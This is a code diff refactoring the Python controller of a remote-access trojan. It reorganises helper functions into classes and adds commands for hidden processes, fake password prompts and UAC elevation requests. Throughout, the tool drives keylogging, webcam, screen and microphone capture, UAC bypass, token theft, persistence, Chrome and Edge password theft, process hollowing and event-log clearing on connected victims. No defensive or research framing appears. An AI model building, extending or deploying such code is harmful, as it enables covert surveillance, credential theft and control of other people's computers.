@@ -17,13 +17,16 @@ commands = {'help': ['Show this help'],
             'kill': ['Kill current connection'],
             'lcd': ['Change local working directory'],
             'lls': ['List local files'],
+            'getinfo': ['Get system information'],
             'upload': ['Upload a file to client'],
             'download': ['Download a file from client'],
             'run': ['Create a process without waiting for termination'],
+            'ps': ['List running process'],
             'screenshot': ['Grab a screenshot'],
             'webcam': ['Take a snapshot from webcam'],
             'keylog': ['Capture keystrokes'],
             'record': ['Record an audio from microphone'],
+            'drives': ['List drives'],
             'idletime': ['Display how much time the user is inactive'],
             'bypassuac': ['Elevate as administrator without UAC prompt'],
             'stealtoken': ['Duplicate access token from a running process'],
@@ -32,10 +35,10 @@ commands = {'help': ['Show this help'],
             'runpe': ['Process hollowing'],
             'poweroff': ['Fast shutdown'],
             'setcritical': ['Set as critical process'],
-            'ps': ['List running process'],
-            'drives': ['List drives'],
-            'getinfo': ['Get information'],
             'msgbox': ['Pop up a custom message box'],
+            'run_hide': ['Create a hidden process'],
+            'askpass': ['Pop up a password prompt'],
+            'askuac': ['Ask for UAC elevation'],
             'clearlog': ['Clear event logs']
             }
 
@@ -48,9 +51,8 @@ class Server:
         self.socket = None
         self.connections = []
         self.addresses = []
-        self.aliases = {}
 
-    def create_socket(self):
+    def listen(self):
         try:
             self.socket = socket.socket()
             self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -60,7 +62,7 @@ class Server:
             print(e)
             sys.exit(1)
 
-    def accept_connections(self):
+    def accept(self):
         while True:
             try:
                 conn, address = self.socket.accept()
@@ -72,14 +74,14 @@ class Server:
                 print('[-] Error accepting connections: ' + str(e))
                 time.sleep(5)
 
-    def start_shell(self):
+    def interact(self):
         while True:
             try:
                 cmd = input('flc> ')
                 if not cmd:
                     continue
                 elif cmd == 'help':
-                    print_help()
+                    Helper.print_help()
                 elif cmd in ['quit', 'exit']:
                     self.socket.close()
                     sys.exit(0)
@@ -90,25 +92,25 @@ class Server:
                     if conn is not None:
                         self.send_commands(conn, target)
                 elif cmd[:2] == 'cd':
-                    lcd(cmd[3:])
+                    Helper.lcd(cmd[3:])
                 elif cmd == 'ls':
-                    lls()
+                    Helper.lls()
                 elif cmd.split(' ')[0] == 'alias':
-                    self.handle_aliases(' '.join(cmd.strip().split()))
+                    Alias.handle_aliases(' '.join(cmd.strip().split()))
                 else:
                     print('[-] Command not recognized')
             except KeyboardInterrupt:
                 self.socket.close()
                 sys.exit(0)
             except Exception as e:
-                print_error('[-] Error: ' + str(e))
+                Helper.print_error('[-] Error: ' + str(e))
 
     def list_connections(self):
         results = ''
         for i, conn in reversed(list(enumerate(self.connections))):
             try:
-                send(conn, 'null')
-                recv(conn)
+                Helper.send(conn, 'null')
+                Helper.recv(conn)
             except:
                 del self.connections[i]
                 del self.addresses[i]
@@ -123,8 +125,8 @@ class Server:
             target = int(target)
             conn = self.connections[target]
             try:
-                send(conn, 'null')
-                recv(conn)
+                Helper.send(conn, 'null')
+                Helper.recv(conn)
             except:
                 del self.connections[target]
                 del self.addresses[target]
@@ -139,139 +141,164 @@ class Server:
     def send_commands(self, conn, target):
         while True:
             try:
-                cmd = input(recv_text(conn))
+                command = Command()
+                cmd = input(Helper.recv_text(conn))
+                cmd_name = cmd.split(' ')[0]
                 if not cmd:
-                    send(conn, 'null')
-                elif cmd.split(' ')[0] in self.aliases:
-                    self.send_aliases(conn, ' '.join(cmd.strip().split()))
+                    Helper.send(conn, 'null')
+                elif cmd_name in Alias.aliases:
+                    Alias.send_aliases(conn, ' '.join(cmd.strip().split()))
                 elif cmd in ['quit', 'exit']:
-                    send(conn, 'null')
-                    break
-                elif cmd == 'kill':
-                    send(conn, cmd)
+                    Helper.send(conn, 'null')
                     break
                 elif cmd in ['cls', 'clear']:
                     subprocess.call('cls', shell=True)
-                    send(conn, 'null')
-                elif cmd[:3] == 'lcd':
-                    lcd(cmd[4:])
-                    send(conn, 'null')
-                elif cmd == 'lls':
-                    lls()
-                    send(conn, 'null')
-                elif cmd.split(' ')[0] == 'run':
-                    send(conn, cmd)
-                    print(recv_text(conn))
-                elif cmd.split(' ')[0] == 'upload':
-                    upload(conn, cmd)
-                elif cmd.split(' ')[0] == 'download':
-                    send(conn, cmd)
-                    recv_file(conn, ntpath.basename(cmd.split(' ')[1].strip()))
-                elif cmd == 'screenshot':
-                    send(conn, cmd)
-                    recv_file(conn, 'Screenshot' + get_time() + '.png')
-                elif cmd == 'webcam':
-                    send(conn, cmd)
-                    recv_file(conn, 'Webcam' + get_time() + '.png')
-                elif cmd.split(' ')[0] == 'record':
-                    send(conn, cmd)
-                    recv_file(conn, 'Microphone' + get_time() + '.wav')
-                elif cmd.split(' ')[0] == 'keylogger_save':
-                    send(conn, cmd)
-                    recv_file(conn, 'Keystrokes_' + get_time() + '.txt')
-                elif cmd == 'persistence':
-                    select(conn, ['persistence_registry', 'persistence_schtasks', 'persistence_service'])
-                elif cmd == 'bypassuac':
-                    select(conn, ['bypassuac_fodhelper', 'bypassuac_clr'])
-                elif cmd == 'stealtoken':
-                    select(conn,
-                           ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'])
-                elif cmd == 'browser':
-                    select(conn,
-                           ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
-                            'get_history chrome', 'get_history edge'])
-                elif cmd in ['idletime', 'setcritical']:
-                    send(conn, cmd)
-                    print(recv_text(conn))
-                elif cmd == 'poweroff':
-                    send(conn, cmd)
+                    Helper.send(conn, 'null')
+                elif cmd in ['kill', 'poweroff', 'bsod']:
+                    Helper.send(conn, cmd)
                     break
+                elif cmd in Helper.cmds.keys():
+                    print('----- {} -----'.format(cmd))
+                    Helper.select(conn, Helper.cmds.get(cmd))
+                elif hasattr(command, cmd_name):
+                    func = getattr(command, cmd_name)
+                    func(conn, cmd)
                 else:
-                    send(conn, cmd)
-                    print(recv_text(conn))
+                    Helper.send(conn, cmd)
+                    print(Helper.recv_text(conn))
             except ConnectionResetError as e:
                 print('[-] Connection was lost: ' + str(e))
                 del self.connections[target]
                 del self.addresses[target]
                 break
             except KeyboardInterrupt:
-                send(conn, 'null')
+                Helper.send(conn, 'null')
                 break
             except Exception as exception:
-                send(conn, 'null')
-                print_error('[-] Error: ' + str(exception))
+                Helper.send(conn, 'null')
+                Helper.print_error('[-] Error: ' + str(exception))
                 continue
 
-    def handle_aliases(self, cmd):
+
+class Command:
+
+    @staticmethod
+    def lcd(conn, cmd):
+        Helper.lcd(Helper.get_args(cmd))
+        Helper.send(conn, 'null')
+
+    @staticmethod
+    def lls(conn, _):
+        Helper.lls()
+        Helper.send(conn, 'null')
+
+    @staticmethod
+    def upload(conn, cmd):
+        filename = Helper.get_args(cmd)
+        try:
+            if os.path.isfile(filename):
+                Helper.send(conn, 'upload ' + os.path.basename(filename))
+                Helper.send_file(conn, filename)
+                print(Helper.recv_text(conn))
+            else:
+                print('[-] File not found')
+                Helper.send(conn, 'null')
+        except Exception as e:
+            Helper.print_error('[-] Error: ' + str(e))
+
+    @staticmethod
+    def download(conn, cmd):
+        filename = Helper.get_args(cmd)
+        Helper.send(conn, cmd)
+        Helper.recv_file(conn, ntpath.basename(filename))
+
+    @staticmethod
+    def screenshot(conn, cmd):
+        Helper.send(conn, cmd)
+        Helper.recv_file(conn, 'Screenshot{}.png'.format(Helper.get_time()))
+
+    @staticmethod
+    def webcam(conn, cmd):
+        Helper.send(conn, cmd)
+        Helper.recv_file(conn, 'Webcam{}.png'.format(Helper.get_time()))
+
+    @staticmethod
+    def record(conn, cmd):
+        Helper.send(conn, cmd)
+        Helper.recv_file(conn, 'Microphone{}.png'.format(Helper.get_time()))
+
+    @staticmethod
+    def keylogger_save(conn, cmd):
+        Helper.send(conn, cmd)
+        Helper.recv_file(conn, 'Keylog{}.png'.format(Helper.get_time()))
+
+
+class Alias:
+    aliases = {}
+
+    @staticmethod
+    def handle_aliases(cmd):
         args = cmd.split(' ')
-        if len(args) < 2:
-            print('[-] Not enough arguments')
-            return
-        command = cmd.split(' ')[0]
-        subcommand = cmd.split(' ')[1]
-        if subcommand == 'get':
+        if len(args) == 1:
             print('----- Aliases -----')
-            for k, v in self.aliases.items():
+            for k, v in Alias.aliases.items():
                 print('{0:15}{1}'.format(k, v))
             print()
-        elif subcommand == 'create':
+            return
+        command = args[0]
+        subcommand = args[1]
+        if subcommand == 'create':
             if len(args) < 4:
-                print('[-] Not enough arguments')
+                print('[-] Usage: alias create <alias> <command>')
                 return
             alias = cmd.split(' ')[2]
-            self.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
-            self.save_aliases()
+            Alias.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
+            Alias.save_aliases()
             print('[+] Create alias success')
         elif subcommand == 'remove':
             if len(args) < 3:
-                print('[-] Not enough arguments')
+                print('[-] Usage: alias remove <alias>')
                 return
             alias = cmd[len(command + subcommand) + 2:]
-            if alias not in self.aliases:
-                print('[-] Alias does not exists')
+            if alias not in Alias.aliases:
+                print('[-] Alias does not exist: {}'.format(alias))
                 return
-            del self.aliases[alias]
-            self.save_aliases()
+            del Alias.aliases[alias]
+            Alias.save_aliases()
             print('[+] Remove alias success')
         else:
-            print('[-] Invalid argument')
+            print('[-] Unknown command: {}'.format(subcommand))
 
-    def load_aliases(self):
+    @staticmethod
+    def load_aliases():
         try:
             if os.path.isfile('alias.json'):
                 f = open('alias.json', 'r')
-                self.aliases = json.load(f)
+                Alias.aliases = json.load(f)
                 f.close()
         except Exception as exception:
             print('[-] Load aliases error: ' + str(exception))
 
-    def save_aliases(self):
+    @staticmethod
+    def save_aliases():
         try:
-            alias_json = json.dumps(self.aliases)
+            alias_json = json.dumps(Alias.aliases)
             f = open('alias.json', 'w')
             f.write(alias_json)
             f.close()
         except Exception as exception:
             print('[-] Save aliases error: ' + str(exception))
 
-    def send_aliases(self, conn, cmd):
+    @staticmethod
+    def send_aliases(conn, cmd):
         command = cmd.split()[0]
         args = cmd[len(command) + 1:].split(' ')
-        prototype = self.aliases[command]
+        args = [x for x in args if x]
+        prototype = Alias.aliases[command]
         if len(re.findall(r'<.*?>', prototype)) == 0:
             if len(cmd.split(' ')) > 1:
                 print('[-] Command takes no argument')
-                send(conn, 'null')
+                Helper.send(conn, 'null')
                 return
         else:
             if len(args) is len(re.findall(r'<.*?>', prototype)):
@@ -280,129 +307,130 @@ class Server:
                     prototype = re.sub(regex, arg, prototype, count=1)
             else:
                 print('[-] Number of arguments does not match')
-                send(conn, 'null')
+                Helper.send(conn, 'null')
                 return
         print('[+] Sending command: ' + prototype)
-        send(conn, prototype)
-        print(recv_text(conn))
+        Helper.send(conn, prototype)
+        print(Helper.recv_text(conn))
 
 
-def send(conn, data):
-    data = data.encode()
-    conn.send(struct.pack('i', len(data)) + data)
+class Helper:
+    cmds = {
+        'persistence': ['persistence_registry', 'persistence_schtasks', 'persistence_service'],
+        'bypassuac': ['bypassuac_fodhelper', 'bypassuac_clr'],
+        'stealtoken': ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'],
+        'browser': ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
+                    'get_history chrome', 'get_history edge']
+    }
 
+    @staticmethod
+    def print_help():
+        print('----- Commands -----')
+        for k, v in commands.items():
+            print('{0:15}{1}'.format(k, v[0]))
+        print()
 
-def send_file(conn, file):
-    size = struct.pack('i', os.stat(file).st_size)
-    conn.send(size)
-    with open(file, 'rb') as f:
-        while True:
-            data = f.read(1024)
-            if not data:
-                break
-            conn.send(data)
+    @staticmethod
+    def print_error(msg):
+        os.system('')
+        print('\033[0;31m' + msg + '\033[0m')
 
+    @staticmethod
+    def lcd(path):
+        if os.path.exists(path):
+            os.chdir(path)
+        print(os.getcwd())
+        print()
 
-def recv(conn):
-    head = conn.recv(8)
-    status = struct.unpack('i', head[:4])[0]
-    size = struct.unpack('i', head[4:8])[0]
-    data = b''
-    while size:
-        buf = conn.recv(size)
-        size -= len(buf)
-        data += buf
-    return status, data
+    @staticmethod
+    def lls():
+        root, dirs, files = next(os.walk(os.getcwd()))
+        for dir_name in dirs:
+            print(dir_name + '/')
+        for filename in files:
+            print(filename)
+        print()
 
-
-def recv_text(conn):
-    _, data = recv(conn)
-    data = data.decode()
-    if data == 'null':
-        data = ''
-    return data
-
-
-def recv_file(conn, file):
-    try:
-        status, data = recv(conn)
-        if status == 0:
-            print(data.decode())
-        else:
-            with open(file, 'wb') as f:
-                f.write(data)
-            print('[+] File downloaded successfully')
-    except Exception as e:
-        print_error('[-] Error: ' + str(e))
-
-
-def print_error(msg):
-    os.system('')
-    print('\033[0;31m' + msg + '\033[0m')
-
-
-def print_help():
-    print('----- Commands -----')
-    for k, v in commands.items():
-        print('{0:15}{1}'.format(k, v[0]))
-    print()
-
-
-def lcd(path):
-    if os.path.exists(path):
-        os.chdir(path)
-    print(os.getcwd())
-    print()
-
-
-def lls():
-    root, dirs, files = next(os.walk(os.getcwd()))
-    for dir_name in dirs:
-        print(dir_name + '/')
-    for filename in files:
-        print(filename)
-    print()
-
-
-def upload(conn, cmd):
-    file = cmd.split(' ')[1].strip()
-    try:
-        if os.path.isfile(file):
-            send(conn, 'upload ' + os.path.basename(file))
-            send_file(conn, file)
-            print(recv_text(conn))
-        else:
-            print('[-] File not found')
-            send(conn, 'null')
-    except Exception as e:
-        print_error('[-] Error: ' + str(e))
-
-
-def get_time():
-    return str(time.strftime('_%Y%m%d%H%M%S', time.localtime()))
-
-
-def select(conn, cmds):
-    try:
-        str_cmds = ''
-        for i, cmd in enumerate(cmds):
-            str_cmds += str(i) + '. ' + cmd + '\n'
-        print(str_cmds)
-        index = input('Please select: ')
+    @staticmethod
+    def select(conn, cmds):
         try:
-            cmd = cmds[int(index)]
-        except (IndexError, ValueError):
-            print('[-] Invalid selection')
-            send(conn, 'null')
-            return
-        send(conn, cmd)
-        print(recv_text(conn))
-    except KeyboardInterrupt:
-        send(conn, 'null')
+            for i, cmd in enumerate(cmds):
+                print(str(i) + '. ' + cmd)
+            print()
+            index = input('Please select: ')
+            try:
+                cmd = cmds[int(index)]
+            except (IndexError, ValueError):
+                print('[-] Invalid selection')
+                Helper.send(conn, 'null')
+                return
+            Helper.send(conn, cmd)
+            print(Helper.recv_text(conn))
+        except KeyboardInterrupt:
+            Helper.send(conn, 'null')
+
+    @staticmethod
+    def get_args(cmd):
+        cmd_name = cmd.split(' ')[0]
+        cmd_arg = cmd[len(cmd_name) + 1:].strip()
+        return cmd_arg
+
+    @staticmethod
+    def get_time():
+        return str(time.strftime('_%Y%m%d%H%M%S', time.localtime()))
+
+    @staticmethod
+    def send(conn, data):
+        data = data.encode()
+        conn.send(struct.pack('i', len(data)) + data)
+
+    @staticmethod
+    def send_file(conn, file):
+        size = struct.pack('i', os.stat(file).st_size)
+        conn.send(size)
+        with open(file, 'rb') as f:
+            while True:
+                data = f.read(1024)
+                if not data:
+                    break
+                conn.send(data)
+
+    @staticmethod
+    def recv(conn):
+        head = conn.recv(8)
+        status = struct.unpack('i', head[:4])[0]
+        size = struct.unpack('i', head[4:8])[0]
+        data = b''
+        while size:
+            buf = conn.recv(size)
+            size -= len(buf)
+            data += buf
+        return status, data
+
+    @staticmethod
+    def recv_text(conn):
+        _, data = Helper.recv(conn)
+        data = data.decode()
+        if data == 'null':
+            data = ''
+        return data
+
+    @staticmethod
+    def recv_file(conn, file):
+        try:
+            status, data = Helper.recv(conn)
+            if status == 0:
+                print(data.decode())
+            else:
+                with open(file, 'wb') as f:
+                    f.write(data)
+                print('[+] File downloaded successfully')
+        except Exception as e:
+            Helper.print_error('[-] Error: ' + str(e))
 
 
 server = Server()
-server.load_aliases()
-server.create_socket()
-threading.Thread(target=server.accept_connections, daemon=True).start()
-server.start_shell()
+server.listen()
+threading.Thread(target=server.accept, daemon=True).start()
+Alias.load_aliases()
+server.interact()
